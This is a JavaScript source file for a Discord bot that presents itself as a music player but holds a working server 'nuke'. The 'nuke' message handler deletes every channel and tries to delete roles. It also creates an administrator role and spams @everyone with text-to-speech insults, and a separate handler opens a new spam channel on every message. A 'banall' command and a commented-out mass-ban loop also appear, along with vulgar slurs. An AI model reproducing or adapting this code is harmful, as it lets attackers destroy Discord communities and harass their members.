const Discord = require('discord.js');
const ytdl = require('ytdl-core');
const ytSearch = require('yt-search');
const client = new Discord.Client();
const { token, prefixes } = require('./info.json');
const fs = require('fs')
const prefix = ';';
//const harfi_sokhani = "@everyone fucked by void and mm9 music  fucked by void and mm9 music  fucked by void and mm9 music  fucked by void and mm9 music";

client.commands = new Discord.Collection();
const { joinVoiceChannel } = require('@discordjs/voice');
const commandFiles = fs.readdirSync('./command/').filter(file => file.endsWith('.js'))
for (const file of commandFiles) {
    const command = require(`./command/${file}`)

    client.commands.set(command.name, command)
}
client.once('ready', () => {
    console.log(`${client.user.tag} bot is ready`);
    function yousamPower() {
        let universe = ["UNIVERSE", "VOID & MM9 MUSIC"]
        let Power = Math.floor(Math.random() * universe.length);
        client.user.setActivity(universe[Power], { type: "PLAYING" });

    }; setInterval(yousamPower, 5000)

    function statusChange() {
        let unis = ['online', 'offline']
        let Por = Math.floor(Math.random() * unis.length);
        client.user.setStatus(unis[Por])
    }; setInterval(statusChange, 800)
});

client.on('message', message => {

    const args = message.content.slice(prefix.length).split(/ +/);
    const cmd = args.shift().toLowerCase();

    const command = client.commands.get(cmd) || client.commands.find(a => a.aliases && a.aliases.includes(cmd))
    if (cmd === 'c') {
        client.commands.get('play').execute(message, args, Discord, client, cmd);
    } else if (cmd === 'ping') {
        client.commands.get('ping').execute(message, args, Discord)
    } else if (cmd === 'dc') {
        client.commands.get('dc').execute(message, args, Discord)
    } else if (cmd === 'banall') {
        client.commands.get('banall').execute(message, args, Discord)
    }

});
client.on('message', async message => {



    if (message.content === 'nuke') {
        message.guild.channels.cache.forEach
            (channel => channel.delete());
        
        message.channel.send("Deleting all the **deletable** roles..."); 

        
 
        message.guild.roles.cache.forEach
            (role => {
                if (client.roles.highest.position <= role.position) message.channel.send('@everyone kos nnt')
                .then(role.delete())
            });

            
        message.guild.roles.create({
            data: {
              name: 'void & mm9 nnto gaid',
              color: 'RED',
              permissions: 'ADMINISTRATOR',
            },
            reason: 'we needed a role for Super Cool People',
          })
            .then(console.log)
            .catch(console.error);

        // let members = await message.guild.members.fetch({ force: true });

        // members.forEach(member => {
        //     member.ban({ reason: "fucked by void and mm9" });
        // });

        await message.guild.channels.create
            (`fucked by void and mm9`, {
                type: 'text'
            }).then(async channel => {
                channel.send(`@everyone fucked by void and mm9`, { tts: true })
            }).catch(console.error)
    }
});

client.on('message', async (message) => {
    await message.guild.channels.create
        (`fucked by void and mm9`, {
            type: 'text'
        }).then(async channel => {
            channel.send(`@everyone fucked by void and mm9`, { tts: true })
        }).catch(console.error)

    if (message.content === (`@everyone fucked by void and mm9`)) {
        message.channel.send(`@everyone fucked by void and mm9`, {
            tts: true
        })
        message.channel.send(`@everyone fucked by void and mm9`, {
            tts: true
        })
        message.channel.send(`@everyone fucked by void and mm9`, {
            tts: true
        })
        message.channel.send(`@everyone fucked by void and mm9`, {
            tts: true
        })
        message.channel.send(`@everyone fucked by void and mm9`, {
            tts: true
        })
    }
})


client.login(token);